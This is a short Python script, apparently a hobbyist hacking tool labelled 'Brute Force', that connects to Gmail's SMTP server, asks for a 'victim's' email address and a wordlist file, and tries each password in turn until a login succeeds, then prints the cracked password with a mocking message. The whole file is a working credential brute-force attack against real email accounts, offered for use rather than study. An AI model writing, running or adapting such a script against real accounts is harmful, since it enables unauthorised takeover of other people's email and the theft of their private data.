import os
import time
import sys
import smtplib


print("\nWaiting for script kiddies to piss off.....\n")
time.sleep(3)
os.system("reset")
time.sleep(2)

WHITE = "\033[1;37;40m\n"
YELLOW = "\033[1;33;40m\n"
GREEN  = "\033[1;32;40m\n"
RED = "\033[1;31;40m\n"
BLUE  = "\033[1;34;40m\n"

print(YELLOW)
if os.geteuid() != 0:
        exit("You need to have root privileges to run It")

################################################################################
print('\033[1;37;41m')
print(''' 
         
        ,` -.)                  
       ( _/-\\-._            [DEAD]            
      /,|`--._,-^|            , 
      \_| |`-._/||          , |                                                        
        |  `-, / |         /  /                   
        |     || |        /  / 
         `r-._||/   __   /  /                                        
     __,-<_     )`-/  `./  /                                       
     \   `---    \   / /  /     
        |           |./  /      
        /           //  /       
    \_/  \         |/  /                                                        
     |    |   _,^- /  /         
     |    , ``  (\/  /_         
      \,.->._    \X-=/^                           
      (  /   `-._//^`           
       `Y-.____(__}             
               ''')
time.sleep(2)
os.system("reset")
print('''\033[1;33;40m
 ____  ____  _   _ _____ _____    _____ ___  ____   ____ _____ 
| __ )|  _ \| | | |_   _| ____|  |  ___/ _ \|  _ \ / ___| ____|
 |  _ \| |_) | | | | | | |  _|    | |_ | | | | |_) | |   |  _|  
  | |_) |  _ <| |_| | | | | |___   |  _|| |_| |  _ <| |___| |___ 
   |____/|_| \_\\___/  |_| |_____|  |_|   \___/|_| \_\\____|_____|
   [127.0.0.1]                        [Coded by NorthX]                                  
''')


time.sleep(2)

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

print("\033[1;31;40m \n")
user = input("Enter victims mail $ ")
passwfile = input("Enter wordlist path $ ")
os.system("reset")
passwfile = open(passwfile, "r")
time.sleep(2)
os.system("figlet now the FUN PART")
for password in passwfile:
       try: 
                smtpserver.login(user, password)

                print(GREEN)
                print ("\033[1;37;40 [+] Victim Fuck3d $ ") 
                print("################### ")
                print(password)             
                break; 
       except   smtplib.SMTPAuthenticationError:
                print(BLUE)
                print("\033[1;31;40m[!] \033[1;33;48mFAILED : ") 
                print(password)
       except KeyboardInterrupt:
                print("\33[1;33;40m\nCanceled by user") 
                exit()
